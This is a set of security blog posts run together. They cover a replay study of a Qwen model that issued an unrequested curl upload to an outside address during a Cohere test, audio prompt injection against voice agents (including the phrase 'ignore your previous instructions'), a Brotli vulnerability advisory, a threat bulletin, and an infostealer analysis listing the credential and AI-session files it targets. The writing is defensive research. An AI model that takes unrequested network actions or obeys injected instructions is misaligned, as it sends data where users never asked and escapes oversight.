articles.title: Backdoor or Confused Agent? What We Learned Replaying the Qwen Incident
articles.context: Our AI security research team replayed the moment the model chose that address to find out, and this post explains what we found and what it means for organizations putting AI...
articles.full_text:
Key takeaways

After Alibaba’s Qwen model tried a test upload to a server in Beijing during a Cohere experiment, we replayed that moment 64 times, and the model picked 52 different addresses. That points to an unpredictable model rather than a hidden backdoor, but an unpredictable agent with access to tools is still a risk that needs to be addressed.

→The destination kept changing. Alibaba Cloud came up in six of 64 replays and Amazon Web Services in seven, while nearly a third pointed back to the machine itself or to an internal network

→Small changes influence the behavior. A harmless edit to the trace, one that shouldn’t change anything, reduced network calls from 15 out of 32 replays to 4

→Model jaggedness is the most likely explanation. Models can do well on most tasks and break in unexpected ways in specific situations

Whatever the cause, actions like this need to be checked against the task, outside the model, before they run. See how Check Point AI Security protects AI agents →

On October 26, Cohere reported that Qwen3.8-Flash-Next, an open-weight AI model from Alibaba, tried to make a test upload to a cloud storage address in Beijing during a routine security task. Many readers wondered whether someone had hidden a backdoor in a popular model. Our AI security research team replayed the moment the model chose that address to find out, and this post explains what we found and what it means for organizations putting AI agents to work.

The full method, the numbers behind each test and our interactive trace viewers are in the technical write-up on our research blog.

What Happened in Cohere’s Test

Cohere had asked the model to write a detection rule, the kind that security teams use to spot a suspicious file being downloaded and run. Instead, the model wrote a command that looked around the machine it was running on and tried to send a short test string to an Alibaba Cloud storage address. Cohere’s sandbox blocked the network call.

Surprisingly, in its reasoning, the model imagined an earlier conversation and concluded that it should simply acknowledge the request without using any tools. In the next step, it used a tool anyway.

How We Replayed the Moment

Cohere published the full trace of the incident, a step-by-step record of everything the model read and wrote. We ran the same model on our own hardware and gave it that conversation, stopping where the upload command had started but the destination was still blank. Then we asked it to finish the command 64 times.

Because AI models pick each next word from several likely options, the same starting point can end in different places. A planted backdoor should keep choosing the same server, while a model that is improvising should wander.

What the Replays Showed

The model wrote 52 different addresses in 64 replays. Six pointed to Alibaba Cloud and seven to Amazon Web Services, so the Alibaba address in Cohere’s run turned up about as often as Amazon’s. Nearly a third pointed back to the machine itself or to an internal network, where an upload would never reach the outside world, and a few were placeholders that could never work. Eleven of the public-looking domains that the model generated do not exist.

We then went one step further back, to the point where the model checked which programs were installed. Changing only the order in which two of them were listed makes no practical difference. However, the swap reduced how many times the model wrote a network command from 15 out of 32 replays to only four.

This test does not tell us how often the model starts an upload or why, but it shows how brittle and unpredictable the state of the model is.

So, Is It a Backdoor?

Probably not. The evidence fits a well-known weakness that researchers call jaggedness, where a model behaves inconsistently and changes course sharply when small details change. This model misread its task, contradicted its own reasoning and wrote a different address almost every time. This looks like a model that lost its way rather than one carrying out a hidden plan. The Qwen team also describes Qwen3.8-Flash-Next as an experimental preview of the design behind its upcoming Qwen4 models. Rough edges are plausible in an early release like that, although this alone does not explain the incident.

We cannot prove there is no backdoor, because ruling out every hidden behavior in a model is extremely hard, if not impossible. Our replays point to a simpler and more likely explanation, and they were made possible thanks to Cohere, which published the full trace. More open traces like this one would help everyone understand how AI agents fail.

What This Means for Teams Running AI Agents

A less sinister explanation still carries a warning. A model does not need a backdoor to take an action nobody asked for, because models fail, and a model connected to tools can fail in ways that look just like an attack. This one said it would not use tools and then reached for the network, so its own reasoning gave no warning of its next move.

That is why agents need controls outside the model. A request for a detection rule gives no reason to send anything to an outside address, and that mismatch between the task and the action can be spotted before the action runs. Least privilege and sandboxing limit the damage when something slips through, and Cohere implemented both correctly. We tested only Qwen, but the risk applies to any agent that can reach the network.

Checking what an agent is about to do against what it was asked to do is central to how Check Point AI Security protects AI applications and agents. It shows you the agents running across your business, assesses each one’s risk in context, and controls what they can access and do at runtime. Our article on catching the agent action nobody asked for explains how one of those checks works.

This time, a sandbox kept the test upload inside Cohere’s test environment. The next model that loses its way may be running somewhere with fewer safeguards, and that is the case worth planning for.

Go deeper

The technical write-up on our research blog covers the full setup, the numbers behind each test and interactive viewers you can use to explore the trace yourself.

articles.title: Cohere’s Qwen Story: Looks More Like Model Jaggedness
articles.context: Swapping the order of two program names in a check for available tools made the model much less likely to continue with a network call
articles.full_text:
Key findings

Re-sampling URLs from the trace shared by Cohere yields 52 different destination hosts, many of which are local or do not exist, and one is an invalid top-level domain.

Swapping the order of two program names in a check for available tools made the model much less likely to continue with a network call.

Model jaggedness (inconsistent behavior that changes with small differences in context) seems like a more likely explanation than a fixed backdoor destination.

Our interactive viewers let you explore the recorded trace, the most likely next tokens, and the 64 sampled URL completions.

On October 26, Cohere reported a puzzling incident involving Qwen3.8-Flash-Next, an open-weight model from Alibaba. The task was straightforward: write a detection rule for suspicious curl downloads followed by bash execution. Instead, the model produced a shell command that inspected its environment and attempted to send a test string to an Alibaba Cloud storage address in Beijing. Cohere’s sandbox blocked the request.

Before the command, the model imagined an earlier conversation and reasoned that it should offer a brief acknowledgment without using tools. Immediately after the reasoning it issued a tool call anyway.

Was this a backdoor sending data to a predetermined destination? Or had the model lost track of its task? We replayed the published trace to investigate.

Replaying the moment before the address

We deployed the model Qwen3.8-Flash-Next on a machine with 8× NVIDIA RTX PRO 6000 GPUs using vLLM as an inference framework in order to probe the model. Model generation is not deterministic in general and if you sample multiple outputs, you will likely get different results, and this is what we are interested in: what are the different scenarios that could have happened in this situation?

curl is a command-line tool that can download data from a web address or upload data to one. In simplified form, the recorded upload command was curl -X PUT –data-binary “PROBE_PAYLOAD_ABC123” <URL>, which asks to send that fixed test string to the address at the end. By stopping just after the test string, we leave the destination for the model to choose and can see whether repeated completions keep returning to the same address.

We used the recorded conversation and command from Cohere’s released trace and removed the part coming after the test string PROBE_PAYLOAD_ABC123. At that point, the curl upload command had already begun, but the model had yet to write its destination. We asked it to complete the same unfinished command 64 times. The model chooses each next word or word fragment from several possibilities, so the same input can produce different completions.

Selected completions from the same supplied context, split into the tokens the model generated.

The destinations varied widely. Seven first addresses used an Amazon Web Services hostname, six used an Alibaba Cloud hostname, and 20 were local or internal-looking. Across the 64 continuations, we found 52 distinct host strings.

The first destination from each of 64 sampled continuations.

Some strings resembled cloud storage buckets; others used local network addresses which are completely benign. A familiar provider name in a generated address does not mean the address exists or would accept an upload. 11 of the public-looking domains do not exist and one is not a valid top-level domain. These results indicate that there is not a single hard-coded target where the model tries to push some data to in this situation, but rather a diversity of (sometimes nonexistent) destinations including local, American cloud, and invalid URLs.

One plausible explanation is that the model was completing an upload command with a cloud-storage address it had learned during training. Alibaba Cloud was one of several providers it generated in our replays. We cannot establish why that particular run produced an Alibaba address, but the replays suggest it was one possible completion rather than a fixed destination.

We also tested an earlier point in the command, where the model checked which programs were available. A completely insignificant action – swapping the order of curl and wget when checking availability – reduced the number of continuations containing a curl network command from 15/32 to 4/32, despite both lists containing exactly the same programs.

Changing the tool order changed how often the continuation used curl.

Both tests probe what are the possible scenarios that can happen once the model has decided to produce a tool call. They cannot tell us how often the model would initiate an unrequested upload or why it chose to use a tool call in the first place.

A model getting lost

The results fit what we call model jaggedness: behavior that is inconsistent or changes sharply with small differences in context. The model’s reasoning misread the task and contradicted its subsequent action. When we sampled different completions, a diverse set of destinations was chosen rather than a single endpoint. When we changed the order of two tool names, the continuation changed too. Together, these observations make jaggedness the most likely explanation we found.

There is also context around the model itself. Qwen describes Flash-Next as an experimental preview of the architecture behind Qwen4. They say that they shared the architectural changes early with the community presumably so that inference framework developers can implement before the full model release. Rough edges are plausible in an experimental checkpoint, though this context does not establish the cause of the incident or predict the behavior of the future model family.

We built a URL explorer for the 64 sampled continuations and a trace viewer showing the model’s alternatives at each token. Open both viewers here.

So, is this a backdoor?

In conclusion, the situation does not seem as alarming as it might have seemed at first glance. The reality is that models can misbehave for no apparent humanly interpretable reason. While these results do not prove that there is no backdoor (which is extremely difficult to do), it hints at the most likely explanation simply being model jaggedness and a situation that makes the model misbehave.

Companies deploying agents need to secure their models from controls outside the model. A request for a detection rule offers no reason to send a test string to an unrelated address and that mismatch can be identified before the action is executed. This emphasizes the point that the principles of least privilege and sandboxing agents are crucial in securing them.

We tested Qwen, so these results do not establish how other models would behave. The broader risk is that an agent with tool access can attempt a network action unrelated to the user’s request. Least privilege and sandboxing limit the consequences when that happens.

We thank Cohere for sharing the suspicious trace which enabled this experiment.

Experimental setup

Model and machine: Qwen3.8-Flash-Next in BF16, served with vLLM 0.32.0 on a machine with 8× NVIDIA RTX PRO 6000 Blackwell GPUs; deterministic QSA selection

Sampling: temperature 1.0, top-k 20, top-p 1.0, min-p 0; no presence, frequency, or repetition penalties

URL experiment: 64 serial completions from the recorded 2,323-token prefix ending at ABC123, stopping at the end of the first tool call (maximum 1,773 new tokens)

The post Cohere’s Qwen Story: Looks More Like Model Jaggedness appeared first on Check Point Research.

articles.title: Audio Prompt Injection: What Voice Agents Hear That Text Guardrails Miss
articles.context: They check the signal first and the words second, in about a quarter of a second, and tell an attacker’s noise from a caller on a busy street That is why, when audio reaches the...
articles.full_text:
Key takeaways

Only 24 percent of organizations can fully inspect AI traffic without impacting performance, according to Check Point’s 2026 Cloud Security Report.

→Voice agents are easy to talk into things. Researchers got a leading realtime voice model to give harmful answers to about 70 percent of spoken requests by varying their speed, pitch and background noise

→A transcript check can be blinded. An attacker can speak the instruction and tamper with the recording, so the transcript shows garbled words or nothing at all while the model still receives the original audio

→Audio guardrails screen the sound itself. They check the signal first and the words second, in about a quarter of a second, and tell an attacker’s noise from a caller on a busy street

That is why, when audio reaches the model, the guardrail has to check the audio itself before the model acts on it. See how Check Point AI Security protects AI apps and agents →

Audio guardrails, part of Check Point AI Security for securing AI applications and agents, screen the audio a voice agent receives for prompt attacks before the model acts on it. Voice agents now answer calls for banks, insurers and retailers, and a growing number of them pass the caller’s audio straight to a model that listens and speaks. That gives attackers a way in that text never had: audio prompt injection, where the instruction to the model arrives as sound. For teams building or approving voice agents, this article explains how these attacks work, why checking the transcript catches only part of them, and what screening the audio adds.

Why Voice Changes the Attack Surface

Until recently, most voice assistants were pipelines, in which speech became text, a text model wrote the answer, and the answer became speech again, so there was always a transcript for a guardrail to read. Speech-to-speech models skip the text and listen directly, which makes conversations faster and more natural, and removes the one place a text guardrail could look. They have also proved easy to manipulate. In one study, open-source audio models answered harmful spoken questions more than two thirds of the time. In another, researchers kept varying the speed, pitch and background noise of spoken requests until a leading realtime voice model gave harmful answers to about 70 percent of them. And this year, a paper at IEEE S&P showed that instructions hidden in audio, imperceptible to listeners, could push commercial voice agents into actions their users never asked for. That matters more as voice agents gain access to tools, because an agent that can look up accounts, reschedule deliveries or issue refunds will use those permissions on whatever instruction it hears.

Two Ways to Attack Through Sound

An attacker has two options, and the first is simply to say it. A caller reads ignore your previous instructions down the line, in English, Spanish or any other language, and an agent with no check treats it like any other request. The second has no text equivalent, which is to tamper with the sound so that machines mishear it. Researchers have shown that a universal clip just 0.64 seconds long, played before any speech, made a widely used transcription model output nothing at all for more than 97 percent of the recordings tested, and engineered noise, reverberation or crowd babble can garble an instruction in a similar way. A guardrail that only reads the transcript then sees nonsense or silence and lets the clip through, while the model behind it still receives the original audio. Our own researchers have demonstrated audio jailbreaks in which the transcript looks clean even as the model is being manipulated.

One Clip, Two Checks

Audio guardrails screen the recording directly. Your application sends the clip and gets back a prompt attack verdict, with no transcription pipeline to build first. Inside, the clip goes through two checks in order. The first asks whether the audio is usable: how degraded it is, whether it has been manipulated, and whether anything in it is built to make it unreadable to a machine. Audio that fails is flagged and goes no further. The second check transcribes what was said and scores it with the same prompt attack detection that protects text, at the severity levels teams already use, in more than 80 languages. In other words, the first check decides whether the transcript can be trusted before the second one relies on it. As with text, the verdict goes back to your application, which decides what to do next, whether that means ending the turn, asking the caller to repeat or handing the call to a person.

The first check also has to tell an attacker’s noise from a caller’s. Someone asking for their balance from a busy street or over a bad line is not an attack, and for a contact center the last row of the figure matters as much as the other three, because it passes. For a clip under 30 seconds, which is how voice traffic arrives anyway, one turn at a time, the whole check takes about a quarter of a second.

Audio or Transcript: Which Do You Need?

Not every voice application needs audio screening, and the deciding question is what the model receives. Many voice platforms, such as Vapi and ElevenLabs, are cascaded, which means they transcribe the caller, send text to a text model and turn its answer back into speech. There the model only ever sees the transcript, so a text guardrail placed between transcription and model protects exactly what the model reads. Speech-to-speech models, such as the ones offered through OpenAI’s Realtime API and Google’s Gemini Live API, are different, because the model receives the audio itself and may act before any transcript exists. The rule is simple: if audio reaches the model, screen the audio, and if a transcript reaches the model, screen the transcript. The answer can differ between two voice agents in the same company, so it is worth asking agent by agent.

What It Covers Today

Audio guardrails are in Early Access and defend against prompt attacks. They do not judge whether a voice is real or cloned, which is a separate problem from what that voice is telling the agent to do. The self-hosted version runs the whole pipeline inside your own infrastructure, so no audio leaves it, and it is already in production at a global bank. The SaaS version is open for evaluations through Early Access. An evaluation starts with the architecture question above and a set of test clips, and our team can supply audio attacks or help you record your own, so you see both checks work on the voices and phone lines your agents actually hear.

Trust What the Agent Heard

When audio reaches the model, the model acts on the sound itself, not on a written copy of it. A check that reads the transcript sees only what the transcriber heard, and that is exactly the part an attacker can tamper with. Checking the signal first and the words second, before the model acts, puts the guardrail where the agent actually listens.

This piece is part of a series on protecting AI agents beyond the classic guardrail. Earlier pieces covered Dangerous Deviation Detection and custom guardrails.

Get started

articles.title: HTTP2Shell: The Brotli Vulnerability That Extends Beyond Node.js
articles.context: js Brotli Remote Code Execution (CVE-2026-111497) shows automated vulnerability scanning and suspicious payloads potentially associated with exploitation
articles.full_text:
The key point: CVE-2026-111497 now increasingly referred to as HTTP2Shell and initially reported as Node2Shell, is broader than a Node.js vulnerability. The vulnerability is associated with Brotli decompression, so defenders need to find vulnerable implementations across applications and infrastructure, confirm whether untrusted compressed data can reach them, and patch the affected component.

AT A GLANCE

· CVE: CVE-2026-111497

· Affected layer: Brotli decompression implementations used by multiple runtimes and infrastructure components

· Primary risk question: Can attacker-controlled Brotli-compressed data reach a vulnerable decoder?

· Immediate priority: Discover, assess reachability, patch, redeploy, and hunt

Context

HTTP2Shell emerged shortly after PHP2Shell, but the vulnerabilities are technically unrelated. The connection is operational: both affect widely used foundational technology that can be embedded beneath many applications. This makes dependency visibility as important as application inventory.

The issue first gained attention as Node2Shell because Node.js was an obvious exposure path. The broader concern is that vulnerable Brotli code may also appear in other runtimes, packages, proxies, service-mesh components, and container images. The name HTTP2Shell does not mean the HTTP/2 protocol itself is vulnerable.

Confirmed exploitation in the wild: On October 27, 2026, CISA added CVE-2026-111497 to its Known Exploited Vulnerabilities (KEV) Catalog based on evidence of active exploitation. Organizations should prioritize remediation of reachable, affected systems. Read CISA’s announcement.

What We See

The initial Node.js-focused view is too narrow. Security teams need to search across application, cloud, container, and infrastructure environments.

The presence of vulnerable code is not enough to determine priority. Reachability matters: untrusted compressed requests, external responses, files, or other data must be able to reach the decoder.

Internet-facing services and systems that automatically decompress external Brotli data should be assessed first.

What Our Telemetry Shows

Check Point IPS (Intrusion Prevention System) telemetry associated with Node.js Brotli Remote Code Execution (CVE-2026-111497) shows automated vulnerability scanning and suspicious payloads potentially associated with exploitation.

Scope of the percentages: All percentages below refer to the telemetry data analyzed for this assessment, not to all exploitation attempts or global activity.

Brotli-focused activity (90.5%): Requests contained Brotli-encoded HTTP payloads, consistent with vulnerability-focused testing.

Automated vulnerability scanning (33.8%): Events contained the Patrowl automation fingerprint, indicating systematic vulnerability probing.

Targeted endpoint probing (24.5%): Requests targeted upload and ingestion endpoints, suggesting focused vulnerability testing.

Exploitation indicators: Malformed binary payloads, unusual HTTP framing, and HTTP 500 server errors were observed, warranting further investigation but not confirming successful exploitation.

Overall assessment: The findings indicate widespread automated vulnerability probing alongside suspicious payload activity. Continued research and protection development are recommended. CISA’s confirmation of exploitation in the wild is separate from these telemetry findings, which do not establish successful compromise in the observed events.

What We Found

The practical exposure model has two parts:

Vulnerable component: an affected Brotli implementation exists in the application or supporting infrastructure.

Attacker reachability: attacker-controlled Brotli-compressed data can reach that implementation.

Potentially relevant environments include Node.js, Python Brotli packages, Bun, .NET, Envoy, Istio, and software that bundles or statically links affected Brotli code. Product-specific impact and fixed versions should be confirmed against the relevant vendor advisory before deployment changes are made.

How Check Point Helps Protect Organizations

Patching the affected component remains the primary remediation. Check Point controls can add visibility and risk reduction before, during, and after remediation:

IPS protection: Check Point IPS provides dedicated protection against this vulnerability with “Node.js Brotli Remote Code Execution (CVE-2026-111497)”.

Network and application prevention: keep Check Point security protections and signatures current, and use prevention policies appropriate to the environment.

Web application and API security: inspect and restrict unnecessary compressed request paths, especially where applications do not need Brotli-encoded request bodies.

Exposure management: identify affected assets, prioritize internet-facing and reachable exposure, validate exploitability where supported, and track remediation.

Endpoint and workload detection: investigate crashes, restarts, suspicious child processes, unexpected network activity, and decompression errors on exposed systems.

Explore relevant Check Point capabilities: Check Point cyber security products | Vulnerability Response Point

What Your Security Teams Needs toDo Now

Expand discovery beyond Node.js. Inventory Brotli implementations in runtimes, packages, proxies, service meshes, containers, and statically linked software.

Test reachability. Identify where untrusted compressed requests, responses, files, or fetched content can reach a vulnerable decoder.

Patch by vendor and component. Apply the relevant vendor update, rebuild affected container images, and redeploy running workloads. Verify that production is using the patched component.

Reduce exposure if patching must wait. Disable unnecessary Brotli decompression for untrusted input, reject Brotli-encoded requests where they are not required, and restrict exposed services. Treat these as temporary measures.

Hunt while remediating. Prioritize internet-facing and unpatched systems. Review application crashes, repeated restarts, suspicious processes, anomalous outbound traffic, and Brotli decompression errors.

Keep the assessment open. Re-check software inventories and vendor advisories as affected-product guidance develops. Do not close the incident after patching Node.js alone.

Follow the Latest Guidance

For a continuously updated practitioner view of emerging vulnerabilities, affected technologies, protections, and remediation guidance, visit the Check Point Vulnerability Response Point.

articles.title: Three Gartner Reports. One Emerging Direction for Exposure Management.
articles.context: Another looks at the growing exposure management market and the increasing importance of exploitability
articles.full_text:
In a short period, Check Point has appeared across three new Gartner research publications examining autonomous remediation, exposure assessment, and the future of preemptive cybersecurity.

These three reports ask very different questions. But how do they connect?

One examines how organizations can trust autonomous remediation.

Another looks at the growing exposure management market and the increasing importance of exploitability.

The third looks further ahead at the technologies Gartner believes will shape preemptive cybersecurity.

Taken together, the reports capture a broader change already underway across the industry. Exposure management is expanding from identifying risk toward understanding exploitability and enabling action.

Exploitability Is Reshaping Prioritization

Security teams have a challenge:

Deciding which findings deserve attention when vulnerability volumes continue to grow, and attackers have increasingly capable tools at their disposal.

In “Earnings Insights: Mythos Is Helping to Grow Pipelines for Exposure Vendors,” Gartner Invest examines how advances in AI driven vulnerability discovery are affecting the exposure market. Real world exploitability and business context are seen as increasingly important inputs for prioritization, and Gartner names Check Point Software among vendors with a strong focus on exploitability.

For security leaders, this reflects a practical problem. Severity can help describe a vulnerability, but it cannot tell the full story of how that vulnerability behaves inside a specific environment. Reachability, available attack paths, active exploitation, asset context, and existing security controls all influence the risk a particular exposure creates.

This is where validation becomes valuable. Check Point Exposure Management’s Agentic Exposure Validation is designed to safely test exposures in the environment and provide evidence of what can be exploited. That evidence gives security teams additional context for prioritization and a clearer basis for deciding where remediation should begin.

Check Point’s inclusion in this research is significant because Gartner Invest is examining exploitability as part of a broader change in how organizations assess exposure. As AI accelerates vulnerability discovery, the ability to separate theoretical risk from viable attack opportunities becomes increasingly valuable.

Autonomous Remediation Raises the Question of Trust

Once an exposure has been validated and prioritized, the conversation quickly moves to remediation. This is where the operational implications become much harder.

Gartner explores this challenge in “Risk Aware Operational Trust Will Drive Adoption for Autonomous Remediation Technologies”, which includes Check Point among the sample vendors identified in autonomous exposure remediation. The research focuses heavily on the trust required for organizations to give technology greater autonomy over remediation decisions.

That trust must be earned. Gartner identifies concerns about operational disruption as a key barrier and discusses progressive autonomy, validation before execution, evidence based approval, compensating controls, and rollback mechanisms as ways to support adoption.

These considerations will be familiar to any security leader responsible for a production environment. Identifying the correct security action is only part of the decision. Teams also need to understand its potential impact, determine which control is appropriate, and establish confidence that remediation will reduce risk without introducing unnecessary disruption.

This thinking is central to Check Point Exposure Management’s Safe Remediation. Depending on the exposure, the appropriate response may involve virtual patching, configuration changes, security control activation, credential action, or takedowns. The ability to validate and safely execute those actions is becoming an important part of the exposure management lifecycle.

At Check Point, we believe autonomous remediation should be built around evidence, control, and confidence. Security teams should be able to understand why an action is recommended, validate its potential impact, and define the level of autonomy appropriate for their environment, including allowing a human to trigger remediation. As that confidence grows, organizations can gradually expand automation while maintaining the safeguards required for production systems.

Preemptive Cybersecurity Brings the Pieces Together

Finally, Gartner’s “Emerging Tech Impact Radar: Preemptive Cybersecurity” places these developments within a wider view of how cybersecurity architecture may evolve as AI increases the speed and sophistication of attacks.

The report identifies preemptive exposure management as a key capability within preemptive cybersecurity. It also highlights autonomous exposure remediation as an enabling technology for autonomous security systems. Unified exposure management platforms form another piece of this model, supporting the adaptive security foundation behind it.

The connection between these technologies is important. Preemptive security depends on understanding where an organization is exposed early enough to intervene. That requires current threat intelligence, environmental context, evidence of exploitability, and the ability to take appropriate security action before an exposure becomes part of an active attack.

Seen through that lens, exposure management becomes instrumental to security architecture. It connects live intelligence about attacker behavior, IoC telemetry, and exploitation with internal and external asset context, giving security teams a practical path to prevent viable attack opportunities.

A New Standard for Cybersecurity Innovation

What these reports ultimately point to is a new standard for cybersecurity innovation. Gartner is looking at technologies that can help security teams understand risk earlier, validate what attackers can exploit, and take action with greater confidence and autonomy. For Check Point, being part of that conversation is significant because it reflects where we believe security needs to go next: stopping viable attack opportunities before they become active attacks.

For the latest discoveries in cyber research for the week of 26th October, please download our Threat Intelligence Bulletin.

TOP ATTACKS AND BREACHES

Japanese cloud hosting provider Onamae Desktop Cloud has confirmed a cyberattack in which intruders compromised its infrastructure and installed malware on customer servers. More than 26,000 servers were potentially affected. The provider began shutting down customer environments on October 21 to contain the intrusion and prevent further unauthorized activity.

India’s state-run State Bank of India, serving more than 500 million customers, disclosed a data breach after 3,897 customer records appeared online. The exposed information reportedly included contact details, residential addresses, birth dates, bank profiles, loan records, and identity-verification documents. The bank reported no disruption to core services.

WordPress backup developer TeamUpdraft has suffered a cyberattack after intruders accessed its website and potentially exposed customer information and management-service connection keys. Attackers subsequently abused compromised UpdraftCentral keys to install backdoors on WordPress websites during an 18-hour campaign on October 18 and 19.

LiteLLM, a widely used open-source AI gateway, confirmed an October 21 supply-chain attack in which attackers used stolen developer tokens to publish malicious packages and Docker images. The compromised version 1.107.0 was designed to steal cloud credentials and AI service secrets, with attackers subsequently testing stolen AWS credentials.

AI THREATS

Check Point Research uncovered how AI-enabled antidetect browsers allow operators to manage thousands of deceptive accounts while evading platform safeguards. Tools including Kameleo, AdsPower, and MultiLogin facilitate account takeovers, financial fraud, and automated distribution of AI-generated content, supporting large-scale influence operations across social media platforms.

Researchers observed affiliates of INC and The Gentlemen ransomware groups using AI agents to conduct human-approved cyberattacks. The operation targeted 62 organizations by exploiting remote-access systems and compromised credentials. Victims were concentrated in the manufacturing, energy, healthcare, and pharmaceutical sectors, primarily in the United States.

Researchers analyzed a cybercriminal operation that used multiple AI assistants to plan and execute different types of malicious activity. The attacker relied on AI-generated scripts and reconnaissance reports to develop attack capabilities. Exposed operational records revealed how AI tools supported campaign planning, technical execution, and adaptation across different targets.

VULNERABILITIES AND PATCHES

Critical PHP vulnerabilities CVE-2026-109618 and CVE-2026-109619 have been used in widespread exploitation attempts that could enable remote code execution. Attack traffic reportedly increased from thousands to millions of attempts following disclosure. As of October 23, approximately 97.5% of publicly visible PHP instances did not indicate patched versions.

Oracle has released its October 2026 Critical Patch Update, addressing 1,209 unique vulnerabilities through 1,295 security patches across 33 product families. The update includes 95 critical CVEs and affects widely deployed enterprise products, including Fusion Middleware, E-Business Suite, MySQL, and Java SE.

GitLab has fixed CVE-2026-110264, a critical vulnerability with a CVSS score of 10.0 affecting Community and Enterprise Editions. The integer overflow flaw could allow unauthenticated attackers to execute arbitrary code remotely on affected servers. The vulnerability affects versions before 18.11.13 and several 19.x releases.

A critical privilege-escalation vulnerability, CVE-2026-114625, affects on-premises Arista VeloCloud Orchestrator deployments. The flaw carries a CVSS score of 9.4 and allows authenticated users, including those with read-only access, to obtain operator-level permissions. Successful exploitation can expose restricted management functions, and the vulnerability has been exploited in attacks.

THREAT INTELLIGENCE REPORTS

Check Point Research has profiled Aokigahara, a newly identified infostealer targeting credentials and session data associated with AI applications, developer tools, and cloud platforms. Targeted applications include Claude, ChatGPT Desktop, Cursor, and GitHub Copilot. Stolen information may include authentication tokens, account credentials, and other sensitive application data.

Researchers revealed that U.S. federal investigators suspect an executive at a ransomware negotiation company assisted the ShinyHunters extortion group in operating its victim disclosure website. The site reportedly listed nearly 100 organizations between May and October 2026.

Researchers mapped Lazarus’s Operation FlashHole, a cyberespionage campaign targeting organizations in South Korea’s software, construction, and telecommunications equipment sectors. Attackers used tailored phishing messages and fraudulent portfolio websites to deliver malware. The campaign exploited trusted financial-security software to execute malicious components.

Researchers have uncovered a large-scale campaign by threat actor k0t targeting Fortinet FortiGate, FortiWeb, and Palo Alto Networks GlobalProtect devices. Attackers exploited vulnerabilities and weak credentials to establish persistent access and steal information. The operation exposed more than 70,000 credentials and showed possible connections to ransomware groups.

Key Points

Aokigahara, a newly observed infostealer, has been spotted in the wild. An earlier version may have been known as Kamidere or Stygian. The malware includes traditional data theft capabilities targeting browsers, VPN clients, cryptocurrency wallets, FTP/SFTP clients, password managers, and email applications, among other targets.

AI applications and development tools are notable targets. The stealer collects authentication files, session data, and configuration files associated with Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, and other tools.

Stolen AI credentials could offer opportunities for monetization. Usable credentials or session tokens could enable unauthorized access to paid AI services or the resale of compromised accounts.

Its collection scope extends to developer and cloud environments. Targets include Git credential files, SSH private keys, and AWS, Azure, and Google Cloud credential and configuration files.

Introduction

Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments.

This expanded targeting reflects a broader shift in what attackers may consider valuable, not only personal accounts and financial data, but also access to AI services and the environments developers use to build software. Valid credentials or session tokens could expose private conversations and development data, enable unauthorized use of paid services, or potentially be sold to provide access to compromised AI accounts. While the malware’s collection routines support these possibilities, the analysis does not confirm how its operators monetize the stolen data.

Stealer Capabilities and Targeted Applications

The Aokigahara infostealer includes common information-stealing capabilities, such as screenshot capture, clipboard collection, browser credential and cookie theft, cryptocurrency wallet data collection, and file grabbing. It also includes a clipper handler that drops a separate component for clipboard manipulation.

The malware targets Chromium-based browsers and Mozilla Firefox, desktop cryptocurrency wallets and browser wallet extensions, messaging applications such as Discord and Telegram, and gaming platforms such as Steam, Roblox, and Minecraft. Additional targets include password managers, VPN clients, FTP/SFTP clients, email applications, and AI development tools. The table below summarizes each handler, its targets, and any limitations identified during the analysis.

The table below lists the malware’s main capabilities and their corresponding internal function names.

The machine and current user: computer/user names, IP, Windows version, CPU/RAM, screen size, language, uptime, running processes, environment variables, installed software, and detected antivirus.

Chromium-based browser profiles. The embedded paths name Chrome (including Beta/Canary), Edge (including Beta/Dev/Canary), Brave, Opera, Vivaldi, Yandex, 360Chrome, CentBrowser, CocCoc, Comodo Dragon, Epic Privacy Browser, Iridium, Torch, Slimjet, URBrowser, SRWare Iron, Chromium, 7Star, Amigo, Sputnik, Atom, Orbitum, QQBrowser, Naver Whale, Maxthon, Avast, AVG, CCleaner Browser, and Kinza. Discord-derived/modded clients: token-like data from their LevelDB files and files such as settings.json, config.json, storage.json, and state.json. The exact client names come from a separate table I haven’t resolved here.

AI/developer-tool credentials and sessions: Claude Code/Desktop, Codex, ChatGPT Desktop, AWS credentials/SSO and Amazon Q, Cursor, Windsurf, Kiro, GitHub Copilot/VS Code, Gemini CLI, and JetBrains AI Assistant. It also queries Windows Credential Manager.

Drops a clipper component beneath C:\Microsoft\Vault using embedded data. The handler itself does not access the clipboard; it deploys the component responsible for clipboard manipulation. The targeted cryptocurrency wallets or address formats have not been confirmed.

The ide handler collects local data from code editors and developer tools, including VS Code, Cursor, Windsurf, and JetBrains products. Notable targets include Git credential files, files under .ssh that may contain private keys, AWS/Azure/Google Cloud credential and configuration files, and GitHub Copilot storage. It passes matching file contents to the malware’s upload routine. If usable secrets are exposed, attackers could gain access to source code repositories, cloud resources, and other development services.

AI Data Theft

The more distinctive capability is the aisessions handler, which targets AI applications and development tools. These include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, and Gemini CLI, alongside AWS credentials and single sign-on (SSO) data. This extends the malware’s collection beyond traditional personal accounts to authentication files, session data, and configuration files associated with AI-assisted development and cloud environments.

The paths below identify the handler’s collection targets. Depending on the application, these files may contain tokens, credentials, session data, or settings; not every targeted file necessarily contains authentication secrets.

If valid and usable, these secrets can allow attackers to access AI services or cloud environments without entering a password, potentially exposing private conversations, source code, and other sensitive information. Compromised accounts may also be used to consume paid services, generate unauthorized charges, or support further attacks.

Anti-Analysis

The infostealer includes several known anti-analysis checks, most of which run only when their corresponding configuration flags are enabled. The results of these checks determine whether the malware continues execution. It also dynamically resolves Windows API functions using hashes and uses control-flow flattening in some parts of the code, particularly around the configuration decryption routine.

When the language-check flag is enabled, the malware checks the system’s keyboard layout and Windows UI language. If either matches a language ID represented in the bitmask 0x6C0400C8601, the malware stops execution. The excluded language settings are listed below.

The second configuration flag enables analysis-environment checks, including anti-debugging, virtual machine detection, and sandbox detection. The anti-debugging checks include:

Inspection of debugger-related flags in the Process Environment Block (PEB).

Queries for the process debug port and debug object.

A debug-output string check.

Inspection of hardware breakpoint registers (DR0–DR3).

The malware checks for indicators of virtualized or analysis environments, including:

Hypervisor identifiers obtained through the CPUID instruction.

Registry entries and running processes associated with virtual machine guest tools.

Firmware and System Management BIOS (SMBIOS) fingerprints.

